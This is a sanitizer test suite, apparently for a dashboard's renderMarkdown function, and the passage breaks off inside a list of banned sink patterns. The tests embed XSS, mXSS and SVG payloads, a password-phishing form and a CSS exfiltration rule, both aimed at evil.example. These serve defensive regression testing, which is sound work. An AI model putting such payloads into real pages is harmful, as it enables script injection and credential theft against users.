// Sanitizer tests for the real exported renderMarkdown.
//
// Task descriptions and comment bodies are mirrored verbatim from third-party
// sources (GitHub issue and comment bodies), so renderMarkdown is the security
// boundary between attacker-controlled markdown and the dashboard DOM. These
// tests pin that boundary: the payloads below must stay neutralised across any
// future change to the sanitizer configuration.
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, relative } from 'node:path';
import { JSDOM } from 'jsdom';

// Deliberate version skew, do not "fix" blindly: package.json declares
// jsdom@^26.1.0 but @types/jsdom@^28.0.3. DefinitelyTyped publishes no types for
// jsdom 22-26 (its version list jumps 21.1.7 -> 27.0.0), and jsdom ships none of
// its own, so no matching major exists to pin to. 28.0.3 is `latest` and covers
// the two APIs used here (`new JSDOM(string)` and `.window`), both stable across
// all of these majors. jsdom is held at 26 because the component harness on the
// Phase 2 branch is built against it; renderMarkdown's output was verified
// byte-identical on 26.1.0 and 29.1.1 over a 95-payload corpus before pinning.
//
// DOMPurify binds to `globalThis.window` when its module is first evaluated, so
// a DOM has to exist before markdown.js (and its dompurify import) is loaded.
const dom = new JSDOM('');
const globals = globalThis as unknown as { window?: unknown; document?: unknown };
globals.window = dom.window;
globals.document = dom.window.document;

const { renderMarkdown } = await import('./markdown.js');

const failures: string[] = [];
let checks = 0;

function check(name: string, fn: () => void): void {
  checks += 1;
  try {
    fn();
  } catch (err) {
    failures.push(`${name}: ${(err as Error).message}`);
  }
}

function parse(html: string): HTMLElement {
  const host = dom.window.document.createElement('div');
  host.innerHTML = html;
  return host as unknown as HTMLElement;
}

function assertNoElement(html: string, selector: string, message: string): void {
  if (parse(html).querySelector(selector) !== null) {
    throw new Error(`${message}: found <${selector}> in ${JSON.stringify(html)}`);
  }
}

function assertElement(html: string, selector: string, message: string): void {
  if (parse(html).querySelector(selector) === null) {
    throw new Error(`${message}: no <${selector}> in ${JSON.stringify(html)}`);
  }
}

function assertNotContains(html: string, needle: string, message: string): void {
  if (html.toLowerCase().includes(needle.toLowerCase())) {
    throw new Error(`${message}: found ${JSON.stringify(needle)} in ${JSON.stringify(html)}`);
  }
}

function assertContains(html: string, needle: string, message: string): void {
  if (!html.includes(needle)) {
    throw new Error(`${message}: missing ${JSON.stringify(needle)} in ${JSON.stringify(html)}`);
  }
}

function assertEqual(actual: string, expected: string, message: string): void {
  if (actual !== expected) {
    throw new Error(`${message}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
  }
}

/** Fails if any element in the output carries an inline event handler. */
function assertNoEventHandlers(html: string, message: string): void {
  for (const el of parse(html).querySelectorAll('*')) {
    for (const attr of el.attributes) {
      if (attr.name.toLowerCase().startsWith('on')) {
        throw new Error(`${message}: ${el.tagName} has ${attr.name} in ${JSON.stringify(html)}`);
      }
    }
  }
}

// ---------------------------------------------------------------------------
// 1. Phishing surface — issue #195. Form controls must not survive.
// ---------------------------------------------------------------------------

function formControls(): void {
  const phishing = renderMarkdown(
    '<form action="https://evil.example"><input name=token type=password>' +
      '<button>Sign in</button></form>',
  );

  check('form tag stripped', () => {
    assertNoElement(phishing, 'form', 'credential-phishing form survived');
  });
  check('form action attribute stripped', () => {
    assertNotContains(phishing, 'evil.example', 'attacker origin survived');
    assertNotContains(phishing, 'action', 'action attribute survived');
  });
  check('password input stripped', () => {
    assertNoElement(phishing, 'input', 'password field survived');
    assertNotContains(phishing, '<input', 'input tag survived');
  });
  check('submit button stripped', () => {
    assertNoElement(phishing, 'button', 'submit button survived');
  });

  check('select and option stripped', () => {
    const out = renderMarkdown('<select><option>a</option></select>');
    assertNoElement(out, 'select', 'select survived');
    assertNotContains(out, '<option', 'option survived');
  });
  check('textarea stripped', () => {
    const out = renderMarkdown('<textarea>x</textarea>');
    assertNoElement(out, 'textarea', 'textarea survived');
  });
  // Read this check's name literally: it asserts the TAG rule, not the attribute
  // rule. `formaction` is only valid on <button>/<input> and `action` only on
  // <form>, and all three tags are in FORBID_TAGS, so the host tag is stripped
  // before either attribute rule is ever consulted. Both FORBID_ATTR entries can
  // therefore be deleted with this suite fully green — they are deliberate
  // defence in depth and are not testable in isolation through renderMarkdown.
  // Keep them; do not infer from this check that they are covered.
  check('formaction cannot survive because its host tag is stripped', () => {
    const out = renderMarkdown('<button formaction="https://evil.example">go</button>');
    assertNotContains(out, 'formaction', 'formaction survived');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
  });
}

// ---------------------------------------------------------------------------
// 2. Spoofing surface — audit findings LOW-1 (style) and LOW-2 (download).
// ---------------------------------------------------------------------------

function spoofingAttributes(): void {
  check('style attribute stripped', () => {
    const out = renderMarkdown(
      '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh">overlay</div>',
    );
    assertNotContains(out, 'style=', 'inline style survived');
    assertNotContains(out, 'position:fixed', 'overlay styling survived');
    assertContains(out, 'overlay', 'element content should be preserved');
  });

  check('download attribute stripped', () => {
    const out = renderMarkdown('<a href="https://x.example/f" download="invoice.pdf">dl</a>');
    assertNotContains(out, 'download', 'download attribute survived');
    assertContains(out, 'https://x.example/f', 'safe href should be preserved');
  });

  // A non-modal <dialog> gets `position: absolute` and an opaque
  // `background-color: Canvas` from the HTML Standard's default rendering, so it
  // is an overlay primitive that needs no style attribute to work.
  check('dialog stripped (no fake modal)', () => {
    const out = renderMarkdown('<dialog open>Enter your password</dialog>');
    assertNoElement(out, 'dialog', 'dialog survived');
    assertContains(out, 'Enter your password', 'content should be preserved');
  });

  // Both sinks inject this HTML inside a Lit shadow root that carries the
  // component's own stylesheet, so a surviving class would resolve against real
  // component CSS. This is the audit's verified forged-comment-header payload.
  check('class attribute stripped (no CSS-reuse forgery)', () => {
    const out = renderMarkdown(
      '<div class="comment"><div class="comment-header">' +
        '<span class="comment-author">farmtable-admin</span>' +
        '<span class="comment-time">2 minutes ago</span></div>' +
        '<div class="comment-body">Your session expired.</div></div>',
    );
    assertNotContains(out, 'class=', 'class attribute survived');
    assertNotContains(out, 'comment-header', 'component class name survived');
    assertContains(out, 'farmtable-admin', 'text content should be preserved');
  });
}

// ---------------------------------------------------------------------------
// 3. Script execution regressions. These already hold; pinned so that a future
//    configuration change cannot silently reopen script execution.
// ---------------------------------------------------------------------------

function scriptExecution(): void {
  check('script tag stripped', () => {
    const out = renderMarkdown('<script>alert(1)</script>');
    assertNoElement(out, 'script', 'script survived');
    assertNotContains(out, 'alert(1)', 'script body survived');
  });

  check('inline event handler stripped', () => {
    const out = renderMarkdown('<img src=x onerror=alert(1)>');
    assertNoEventHandlers(out, 'event handler survived');
    assertNotContains(out, 'onerror', 'onerror survived');
  });

  check('javascript: href stripped', () => {
    const out = renderMarkdown('[click](javascript:alert(1))');
    assertNotContains(out, 'javascript:', 'javascript: URL survived');
    assertContains(out, 'click', 'link text should be preserved');
  });

  check('data: html href stripped', () => {
    const out = renderMarkdown('[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)');
    assertNotContains(out, 'data:text/html', 'data: HTML URL survived');
  });

  check('iframe srcdoc stripped', () => {
    const out = renderMarkdown('<iframe srcdoc="<script>alert(1)</script>"></iframe>');
    assertNoElement(out, 'iframe', 'iframe survived');
    assertNotContains(out, 'srcdoc', 'srcdoc survived');
  });

  check('mXSS mglyph payload neutralised', () => {
    const out = renderMarkdown(
      '<math><mtext><table><mglyph><style><!--</style><img title="-->' +
        '<img src=1 onerror=alert(1)>">',
    );
    assertNoElement(out, 'img', 'mXSS img survived');
    assertNoEventHandlers(out, 'mXSS handler survived');
    assertNotContains(out, 'alert(1)', 'mXSS payload survived');
  });

  check('base tag stripped', () => {
    const out = renderMarkdown('<base href="https://evil.example/">');
    assertNoElement(out, 'base', 'base survived');
    assertNotContains(out, 'evil.example', 'base href survived');
  });

  check('meta refresh stripped', () => {
    const out = renderMarkdown('<meta http-equiv="refresh" content="0;url=https://evil.example">');
    assertNoElement(out, 'meta', 'meta survived');
    assertNotContains(out, 'evil.example', 'redirect target survived');
  });

  check('object and embed stripped', () => {
    const out = renderMarkdown(
      '<object data="https://evil.example/x"></object><embed src="https://evil.example/y">',
    );
    assertNoElement(out, 'object', 'object survived');
    assertNoElement(out, 'embed', 'embed survived');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
  });

  check('style element stripped', () => {
    const out = renderMarkdown('<style>body{display:none}</style>');
    assertNoElement(out, 'style', 'style element survived');
    assertNotContains(out, 'display:none', 'style rules survived');
  });

  check('target attribute stripped (no tabnabbing)', () => {
    const out = renderMarkdown('<a href="https://x.example" target="_blank">x</a>');
    assertNotContains(out, 'target', 'target survived');
  });
}

// ---------------------------------------------------------------------------
// 3b. SVG. <svg> is in DOMPurify's default allowlist and survives, and SVG is
//     historically the richest bypass surface after MathML: foreignObject
//     re-enters the HTML namespace, the animation elements can retarget an
//     attribute at runtime, and xlink:href is a second URL channel that a naive
//     href-only check misses. All of these are neutralised today; pinned so a
//     configuration change cannot silently reopen them.
//
//     Note both assertion styles are used throughout, for the reason given at
//     the mXSS check above: a structural query alone can false-negative on
//     re-parse.
// ---------------------------------------------------------------------------

function svgSurface(): void {
  // foreignObject is an HTML integration point, so a form inside it is parsed in
  // the HTML namespace and would be a working phishing form if it survived.
  check('svg foreignObject cannot smuggle form controls', () => {
    const out = renderMarkdown(
      '<svg><foreignObject><form action="https://evil.example">' +
        '<input name=token type=password></form></foreignObject></svg>',
    );
    assertNoElement(out, 'form', 'form survived inside foreignObject');
    assertNoElement(out, 'input', 'password field survived inside foreignObject');
    assertNotContains(out, 'foreignobject', 'foreignObject survived');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
  });

  check('svg script element stripped', () => {
    const out = renderMarkdown('<svg><script>alert(1)</script></svg>');
    assertNoElement(out, 'script', 'script survived inside svg');
    assertNotContains(out, 'alert(1)', 'script body survived');
  });

  check('svg event handler stripped', () => {
    const out = renderMarkdown('<svg onload=alert(1)><circle onclick=alert(2)></circle></svg>');
    assertNoEventHandlers(out, 'svg event handler survived');
    assertNotContains(out, 'onload', 'onload survived');
    assertNotContains(out, 'alert(', 'handler body survived');
  });

  // animate/set can rewrite another element's attribute after sanitization, so
  // they are a way to introduce a javascript: URL that was never in the markup.
  check('svg animation elements stripped', () => {
    const animate = renderMarkdown(
      '<svg><animate attributeName="href" values="javascript:alert(1)"></animate></svg>',
    );
    assertNoElement(animate, 'animate', 'animate survived');
    assertNotContains(animate, 'attributename', 'animate attributeName survived');
    assertNotContains(animate, 'javascript:', 'animated javascript: URL survived');

    const set = renderMarkdown(
      '<svg><set attributeName="href" to="javascript:alert(1)"></set></svg>',
    );
    assertNoElement(set, 'set', 'set survived');
    assertNotContains(set, 'javascript:', 'animated javascript: URL survived');
  });

  // xlink:href is a separate attribute from href and needs its own coverage.
  check('svg xlink:href javascript URL stripped', () => {
    const out = renderMarkdown(
      '<svg><a xlink:href="javascript:alert(1)"><text y="20">click</text></a></svg>',
    );
    assertNotContains(out, 'javascript:', 'xlink javascript: URL survived');
    assertNotContains(out, 'xlink', 'xlink attribute survived');
    assertContains(out, 'click', 'link text should be preserved');
  });

  check('svg use element stripped', () => {
    const out = renderMarkdown(
      '<svg><use href="#x"></use>' +
        '<use xlink:href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="></use></svg>',
    );
    assertNoElement(out, 'use', 'use survived');
    assertNotContains(out, 'data:image/svg+xml', 'data: URL reference survived');
  });

  check('svg image javascript URL stripped', () => {
    const out = renderMarkdown('<svg><image href="javascript:alert(1)"></image></svg>');
    assertNotContains(out, 'javascript:', 'image javascript: URL survived');
    assertNoEventHandlers(out, 'image event handler survived');
  });

  // DOMPurify strips <style> in the HTML namespace by default but allows it in
  // the SVG one, so this is the one place a <style> element can reach the shadow
  // root. Arbitrary CSS there outranks the forbidden inline style attribute: it
  // restyles the whole component, not one element.
  check('svg style element stripped (no CSS injection into the shadow root)', () => {
    const out = renderMarkdown(
      '<svg><style>:host{position:fixed;top:0;left:0;width:100vw;height:100vh;' +
        'background:#fff;z-index:9999}</style></svg>',
    );
    assertNoElement(out, 'style', 'style element survived inside svg');
    assertNotContains(out, 'position:fixed', 'overlay rule survived');
    assertNotContains(out, 'z-index', 'stacking rule survived');
  });

  // Distinct from the visual-spoofing case above: @import and url() in a rule
  // reach an attacker origin with no user interaction, so the fix has to be
  // pinned against the remote-fetch vector specifically and not just the
  // overlay one.
  check('svg style cannot reach an attacker origin', () => {
    const imported = renderMarkdown(
      '<svg><style>@import url(https://evil.example/x.css);</style></svg>',
    );
    assertNoElement(imported, 'style', 'style element survived');
    assertNotContains(imported, '@import', '@import survived');
    assertNotContains(imported, 'evil.example', 'remote stylesheet origin survived');

    const exfil = renderMarkdown(
      '<svg><style>a[href^="https://internal"]{background:url(https://evil.example/leak)}' +
        '</style></svg>',
    );
    assertNoElement(exfil, 'style', 'style element survived');
    assertNotContains(exfil, 'evil.example', 'exfiltration origin survived');
  });

  // The sinks wrap markdown in block containers, so a payload does not need a
  // top-level raw-HTML block to reach the sanitizer. These three are the cases
  // proving the <svg><style> fix is reachable through ordinary markdown, so they
  // are the most load-bearing of the round-2 security work.
  //
  // One check() per container, deliberately. These were previously three
  // payloads looped inside a single check(), which made them invisible to the
  // EXPECTED_CHECKS pin: emptying the list left the suite green at the same
  // total. Splitting them puts each payload under the check-total pin that
  // already exists and is already proven to fire, rather than introducing a
  // second, parallel length assertion that would itself need guarding.
  const assertSvgStyleStripped = (md: string): void => {
    const out = renderMarkdown(md);
    assertNoElement(out, 'style', `style survived in ${JSON.stringify(md)}`);
    assertNotContains(out, 'display:none', `style rules survived in ${JSON.stringify(md)}`);
  };

  check('svg style stripped inside a markdown list', () => {
    assertSvgStyleStripped('- <svg><style>*{display:none}</style></svg>');
  });

  check('svg style stripped inside a blockquote', () => {
    assertSvgStyleStripped('> <svg><style>*{display:none}</style></svg>');
  });

  check('svg style stripped inside a table cell', () => {
    assertSvgStyleStripped('| a |\n| - |\n| <svg><style>*{display:none}</style></svg> |');
  });
}

// ---------------------------------------------------------------------------
// 4. Positive cases. A sanitizer that breaks ordinary rendering is its own
//    outage, so pin the shapes real task descriptions rely on.
// ---------------------------------------------------------------------------

function ordinaryMarkdown(): void {
  check('headings render', () => {
    assertEqual(renderMarkdown('# Title'), '<h1>Title</h1>\n', 'heading changed');
  });

  check('emphasis renders', () => {
    assertEqual(
      renderMarkdown('**bold** and _em_'),
      '<p><strong>bold</strong> and <em>em</em></p>\n',
      'emphasis changed',
    );
  });

  check('safe links render with href intact', () => {
    const out = renderMarkdown('[docs](https://example.com/docs)');
    assertElement(out, 'a[href="https://example.com/docs"]', 'safe link lost its href');
    assertContains(out, 'docs</a>', 'link text lost');
  });

  check('relative links render', () => {
    assertElement(renderMarkdown('[t](/tasks/1)'), 'a[href="/tasks/1"]', 'relative link lost');
  });

  // marked emits class="language-js" here; FORBID_ATTR strips it. Nothing in
  // this repo consumes that class (there is no syntax highlighter), so the loss
  // is cosmetically and functionally nil.
  check('code blocks render', () => {
    assertEqual(
      renderMarkdown('```js\nconst a = 1;\n```'),
      '<pre><code>const a = 1;\n</code></pre>\n',
      'code block changed',
    );
  });

  check('inline code escapes html', () => {
    const out = renderMarkdown('use `<form>` here');
    assertContains(out, '<code>&lt;form&gt;</code>', 'inline code lost its escaped content');
    assertNoElement(out, 'form', 'inline code produced a real form');
  });

  check('lists render', () => {
    assertEqual(
      renderMarkdown('- one\n- two\n'),
      '<ul>\n<li>one</li>\n<li>two</li>\n</ul>\n',
      'list changed',
    );
  });

  check('tables render', () => {
    const out = renderMarkdown('| a | b |\n| - | - |\n| 1 | 2 |\n');
    assertElement(out, 'table', 'table lost');
    assertContains(out, '<th>a</th>', 'table header lost');
  });

  check('images with safe src render', () => {
    assertElement(
      renderMarkdown('![alt](https://example.com/i.png)'),
      'img[src="https://example.com/i.png"]',
      'safe image lost',
    );
  });

  check('empty input renders empty', () => {
    assertEqual(renderMarkdown(''), '', 'empty markdown should render empty');
  });
}

// ---------------------------------------------------------------------------
// 5. Task lists. FORBID_TAGS strips marked's <input type=checkbox>, so
//    renderMarkdown substitutes an inert glyph. Pin that the checked and
//    unchecked states stay distinguishable, that the state is still exposed to
//    assistive technology, and that no input comes back.
// ---------------------------------------------------------------------------

function taskLists(): void {
  check('task list state survives without an input element', () => {
    const out = renderMarkdown('- [ ] todo\n- [x] done\n');
    assertNoElement(out, 'input', 'checkbox input survived');
    assertContains(out, '☐\uFE0E', 'unchecked state lost');
    assertContains(out, '☑\uFE0E', 'checked state lost');
    assertContains(out, 'todo', 'unchecked item text lost');
    assertContains(out, 'done', 'checked item text lost');
  });

  // The real <input type=checkbox> was announced with a checked/unchecked state;
  // the glyph only keeps that for screen readers via role + aria-label, so pin
  // both labels and their pairing with the right glyph.
  check('task list state is exposed to assistive technology', () => {
    const out = renderMarkdown('- [ ] todo\n- [x] done\n');
    assertElement(out, 'span[role="img"][aria-label="Completed"]', 'checked label lost');
    assertElement(out, 'span[role="img"][aria-label="Not completed"]', 'unchecked label lost');
    assertContains(out, '<span role="img" aria-label="Completed">☑\uFE0E</span>', 'checked pairing lost');
    assertContains(
      out,
      '<span role="img" aria-label="Not completed">☐\uFE0E</span>',
      'unchecked pairing lost',
    );
  });

  check('nested task lists keep their state', () => {
    const out = renderMarkdown('- [x] outer\n  - [ ] inner\n');
    assertNoElement(out, 'input', 'checkbox input survived');
    assertContains(out, '☑\uFE0E</span> outer', 'outer state lost');
    assertContains(out, '☐\uFE0E</span> inner', 'inner state lost');
  });
}

// ---------------------------------------------------------------------------
// 6. Sink binding. Everything above secures a function that nothing forces
//    anyone to call: drop the wrapper at either sink — `unsafeHTML(c.body)`
//    instead of `unsafeHTML(renderMarkdown(c.body))` — and every check above
//    still passes while the whole bug class is back.
//
//    Mechanism: a static scan of the source tree, not a rendering test. A
//    rendering test would be the stronger proof, but instantiating the two Lit
//    components needs custom elements, adopted stylesheets and the Shoelace and
//    gRPC imports they pull in, none of which this plain `node` runner has —
//    that is a vitest-and-a-component-harness change, which is the Phase 2
//    branch's job, not a six-file cleanup's. The static scan costs nothing, has
//    no dependencies, and catches the exact regression described. Its one real
//    weakness is the classic one for source scanning — passing vacuously because
//    it matched no files — so the file count and the sink count are both pinned
//    below, and locating the tree throws rather than returning empty.
//
//    Read the guarantees here narrowly, and read them as TWO mechanisms with
//    very different strength. They keep getting cited as one thing ("G1"), and
//    that conflation is what carried three rounds of evadable checks past
//    sign-off. They are named separately below and they fail with separately
//    worded messages.
//
//    (a) THE PER-FILE BINDING — closed world, and meant to be SOUND.
//        `sinkBindingViolations` holds each file in REQUIRED_SINKS to rules
//        about how `renderMarkdown` and `unsafeHTML` may be USED: imported
//        unaliased from the one module allowed to provide them, never re-bound
//        locally, and never named anywhere except immediately called. That is a
//        finite claim over an enumerated set of two files, so it can be
//        finished, and the bar for it is that no edit to those two files can
//        leave them rendering unsanitized while this suite is green.
//
//    (b) THE TREE-WIDE SCAN — open world, and a TRIPWIRE, NOT A PROOF.
//        BANNED_SINKS, the indirection ban and the call-site collection
//        enumerate spellings across all source files. A regex over source text
//        is a hand-rolled stand-in for the TypeScript module graph, and it
//        disagrees with the real language semantics on aliasing, re-export and
//        indirection: `unsafeHTML as raw` followed by `raw(x)` is the same sink
//        written in a form no `unsafeHTML(` pattern can see. Every review round
//        so far has found a spelling the previous one missed, and the next one
//        will too. A green result from (b) means "none of the listed forms is
//        present in the files that were scanned" — never "no raw sink exists".
//        Do not cite it as the latter; its failure messages will not let you.
//
//    Soundness therefore lives in (a), plus the follow-up issue for type-aware
//    lint (typescript-eslint over resolved symbols) and Trusted Types. Those
//    answer "does any expression in this program evaluate to the raw directive"
//    using the compiler's own scope analysis, which is the question (b) is
//    failing to ask. Extending (b) with more patterns is not a route to (a).
// ---------------------------------------------------------------------------

/**
 * The two components that mirror attacker-controlled markdown into a shadow
 * root. These are named explicitly because the tree-wide assertions further
 * down cannot distinguish "this file still routes through renderMarkdown" from
 * "this file no longer matches my regex" — a sink rewritten into an unmatched
 * form leaves the case list rather than failing a check. Reading each file by
 * path converts that silence into a `readFileSync` throw.
 *
 * Update deliberately: adding a sink here without a corresponding component, or
 * removing one that still exists, is a change to what this suite guarantees.
 */
const REQUIRED_SINKS = [
  'src/components/inspector/ft-inspector-comments.ts',
  'src/components/inspector/ft-inspector-desc.ts',
];

/**
 * Exact number of scannable source files under `src/`. Pinned, not a floor: the
 * previous floor of 10 sat under an actual count of 50, so forty files could
 * have stopped being scanned with no signal. This is the G7 check-total
 * rationale applied one level down — update it deliberately when a source file
 * is added or removed, never to make a red suite go green.
 */
const EXPECTED_SOURCE_FILES = 50;

/** Walks up from this module to the directory containing `src/util/markdown.ts`. */
function findWebRoot(): string {
  let dir = dirname(fileURLToPath(import.meta.url));
  for (let i = 0; i < 8; i += 1) {
    try {
      statSync(join(dir, 'src', 'util', 'markdown.ts'));
      return dir;
    } catch {
      const parent = dirname(dir);
      if (parent === dir) break;
      dir = parent;
    }
  }
  throw new Error('could not locate the web source tree from ' + import.meta.url);
}

// Extensions that cannot hold a raw-HTML sink. Everything else under `src/` is
// scanned.
//
// This is deliberately a DENYLIST. The previous allowlist ('.ts', '.tsx', '.js',
// '.mjs', '.cjs') was written to be "wider than what the tree contains today",
// but it still missed `.mts`, `.cts` and `.jsx` — and that gap was worse than an
// ordinary miss, because the filter runs BEFORE `files` is built, so such a file
// did not move the file-count pin either. There was no signal of any kind.
// Inverting the predicate makes "scanned" the default for whatever module
// extension this project adopts next, which is the property the allowlist's
// comment always claimed but could not deliver. "Not scanned" is
// indistinguishable from "clean" in the results, so the set of unscanned things
// must be the set we can argue about, not the set we happened to list.
const INERT_EXTENSIONS = [
  '.css', '.scss', '.json', '.svg', '.md', '.txt', '.html',
  '.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp', '.woff', '.woff2',
];

function isScannableSource(entry: string): boolean {
  // Test files are excluded so that this file may name the banned identifiers in
  // prose. That exclusion is also why a raw sink in a `*.test.ts` file is
  // invisible here; test files are not bundled into the production build, which
  // is the whole of the argument for accepting it.
  if (/\.test\.[cm]?[jt]sx?$/.test(entry)) return false;
  return !INERT_EXTENSIONS.some((ext) => entry.endsWith(ext));
}

function collectSourceFiles(dir: string, out: string[]): void {
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) {
      collectSourceFiles(full, out);
    } else if (isScannableSource(entry)) {
      out.push(full);
    }
  }
}

// ---------------------------------------------------------------------------
// Source views. Every scan below runs over a derived view of the file, never
// over its raw bytes.
//
// The reason is not tidiness. A guard that rejects correct code gets deleted,
// and the person most likely to trip this one is the next developer writing a
// comment that explains it. Before this change, all of the following turned the
// suite red, in production files, with no raw sink anywhere:
//
//   // SECURITY: never import unsafeHTML as something else.
//   // Do not use document.write( here; use lit templating.
//   const ADVICE = 'never do el.innerHTML = userInput';
//   <!-- renderMarkdown sanitizes with DOMPurify before this HTML is injected. -->
//
// The last one is not hypothetical: it is a real line in
// ft-inspector-desc.ts, and the per-file rules below cannot be stated as
// "renderMarkdown may only appear immediately called" until it is stripped.
// ---------------------------------------------------------------------------

/**
 * Blanks inert text — line comments, block comments, HTML comments inside lit
 * templates, and (optionally) the contents of quoted string literals —
 * replacing each character with a space and preserving every newline, so line
 * numbers in failure messages still point at the real source line.
 *
 * Template literals are NOT treated as strings: `html`…`` bodies are live code
 * in this codebase and contain the real sinks. The scanner tracks `${…}`
 * interpolations with a stack so that quotes inside template text (`title="…"`,
 * an apostrophe in prose) are not mistaken for string delimiters.
 *
 * Known imprecision, recorded rather than hidden: an unparenthesised regex
 * literal containing `//` would be read as the start of a line comment. That
 * fails toward blanking real code, i.e. toward a missed detection rather than a
 * false positive, and no file in this tree contains one. It is one more reason
 * the tree-wide half is documented as a tripwire.
 */
function stripInertText(src: string, opts: { strings: boolean }): string {
  const out = src.split('');
  const blank = (from: number, to: number): void => {
    for (let i = from; i < to && i < out.length; i += 1) {
      if (out[i] !== '\n') out[i] = ' ';
    }
  };
  const modes: ('code' | 'template')[] = ['code'];
  const braces: number[] = [0];
  let i = 0;
  while (i < src.length) {
    const c = src[i];
    const d = src[i + 1];
    if (modes[modes.length - 1] === 'template') {
      if (c === '\\') { i += 2; continue; }
      if (c === '`') { modes.pop(); i += 1; continue; }
      if (c === '$' && d === '{') { modes.push('code'); braces.push(0); i += 2; continue; }
      if (c === '<' && src.startsWith('<!--', i)) {
        const end = src.indexOf('-->', i + 4);
        const to = end === -1 ? src.length : end + 3;
        blank(i, to);
        i = to;
        continue;
      }
      i += 1;
      continue;
    }
    if (c === '/' && d === '/') {
      const end = src.indexOf('\n', i);
      const to = end === -1 ? src.length : end;
      blank(i, to);
      i = to;
      continue;
    }
    if (c === '/' && d === '*') {
      const end = src.indexOf('*/', i + 2);
      const to = end === -1 ? src.length : end + 2;
      blank(i, to);
      i = to;
      continue;
    }
    if (c === "'" || c === '"') {
      let j = i + 1;
      while (j < src.length && src[j] !== c && src[j] !== '\n') {
        j += src[j] === '\\' ? 2 : 1;
      }
      if (opts.strings) blank(i + 1, j);
      i = Math.min(j + 1, src.length);
      continue;
    }
    if (c === '`') { modes.push('template'); i += 1; continue; }
    if (c === '{') { braces[braces.length - 1] += 1; i += 1; continue; }
    if (c === '}') {
      if (braces[braces.length - 1] === 0 && modes.length > 1) {
        modes.pop();
        braces.pop();
      } else if (braces[braces.length - 1] > 0) {
        braces[braces.length - 1] -= 1;
      }
      i += 1;
      continue;
    }
    i += 1;
  }
  return out.join('');
}

/**
 * The greppable opt-out for the TREE-WIDE tripwire only.
 *
 * Comment stripping handles prose; this handles the remaining case, a string
 * literal that legitimately names a banned form. It is deliberately NOT honoured
 * by the per-file rules in `sinkBindingViolations`: disarming the sound half
 * must require editing this test file, where a reviewer will see it, not adding
 * a comment to a component.
 */
const IGNORE_MARKER = 'raw-sink-scan: ignore-line';

function stripIgnoredLines(src: string): string {
  if (!src.includes(IGNORE_MARKER)) return src;
  return src
    .split('\n')
    .map((line) => (line.includes(IGNORE_MARKER) ? '' : line))
    .join('\n');
}

/**
 * Blanks whole `import … from '…';` statements (and side-effect imports).
 *
 * `[^;]` cannot cross a statement boundary, so a value alias sharing a line with
 * an import — `import { html } from 'lit'; const raw = unsafeHTML;` — is still
 * scanned. `await import('…')` has no `from`, so a destructuring rename off a
 * dynamic import is not blanked either; its `unsafeHTML` sits before the
 * `import` keyword and survives regardless.
 */
function stripImportStatements(code: string): string {
  const wipe = (m: string): string => m.replace(/[^\n]/g, ' ');
  return code
    .replace(/\bimport\b[^;]*?\bfrom\b\s*['"][^'"]*['"]\s*;/g, wipe)
    .replace(/\bimport\s*['"][^'"]*['"]\s*;/g, wipe);
}

/** 1-based line numbers at which `re` matches, for actionable failure messages. */
function matchLines(code: string, re: RegExp): number[] {
  const lines: number[] = [];
  code.split('\n').forEach((line, idx) => {
    if (re.test(line)) lines.push(idx + 1);
  });
  return lines;
}

/**
 * Lit's three raw-injection directives, with the module each is exported from.
 *
 * TRIPWIRE INPUT — see mechanism (b) in the section header. Every tree-wide scan
 * here matches on the directive's own name, so any indirection that renames it
 * makes the sink invisible to all of them at once. The rules in
 * `directiveIndirectionOffenders` close the forms we know about; they are not a
 * proof that no other form exists.
 *
 * Module paths are matched on their SUFFIX, not the full specifier. Both
 * `lit/directives/unsafe-html.js` and `lit-html/directives/unsafe-html.js`
 * resolve to the same directive and both packages are installed here, so
 * anchoring on the `lit/` prefix would leave the second path as a one-word
 * bypass. (Verified: it was.)
 */
const RAW_DIRECTIVES = [
  { name: 'unsafeHTML', module: 'directives/unsafe-html.js' },
  { name: 'unsafeSVG', module: 'directives/unsafe-svg.js' },
  { name: 'unsafeStatic', module: 'static-html.js' },
];

/**
 * Raw-HTML injection APIs that must not appear outside renderMarkdown.
 *
 * TRIPWIRE, NOT A PROOF OF ABSENCE — see mechanism (b) in the section header.
 * This is an enumeration of KNOWN SINKS. It can only catch the forms named here
 * and it must be revisited whenever this codebase adopts a new raw-injection
 * API. Do not read a green result as "no raw sink exists" — read it as "none of
 * these eight forms is present in the files that were scanned".
 *
 * Known residue, recorded deliberately rather than chased: `Object.assign(el, {
 * innerHTML: x })`, a computed key (`el[k] = x` where `k` is built at runtime),
 * and any raw-write API not on this list all pass. Widening the list is the
 * treadmill this guard is on; the closed-world half plus the type-aware-lint
 * follow-up is the route off it, not a ninth pattern.
 *
 * The operator class is `(?:\+|\|\||&&|\?\?)?=` because `\s*\+?=` admitted `+=`
 * but not `||=`, `&&=` or `??=`. The trailing `(?!=)` keeps `el.innerHTML ===
 * x` — a comparison, not a write — out of the results.
 *
 * FALSE POSITIVES: these patterns run over a comment-stripped view of the file,
 * so prose naming a banned form is safe. A string literal that must name one
 * (an error message, a lint fixture) can opt out with a trailing
 * `// raw-sink-scan: ignore-line`, which blanks that line for the tree-wide
 * scans only. Grep for the marker in review; it is not honoured by the per-file
 * rules in `sinkBindingViolations`.
 */
const BANNED_SINKS: { name: string; pattern: RegExp }[] = [
  { name: 'innerHTML/outerHTML assignment', pattern: /\.(inner|outer)HTML\s*(?:\+|\|\||&&|\?\?)?=(?!=)/ },
  {
    name: 'innerHTML/outerHTML indexed assignment',
    pattern: /\[['"](inner|outer)HTML['"]\]\s*(?:\+|\|\||&&|\?\?)?=(?!=)/,
  },
  { name: 'insertAdjacentHTML', pattern: /insertAdjacentHTML\s*\(/ },
  { name: 'document.write', pattern: /document\.write\s*\(/ },
  { name: 'setHTMLUnsafe', pattern: /setHTMLUnsafe\s*\(/ },
  { name: 'createContextualFragment', pattern: /createContextualFragment\s*\(/ },
  { name: 'lit unsafeSVG directive', pattern: /unsafeSVG\s*\(/ },
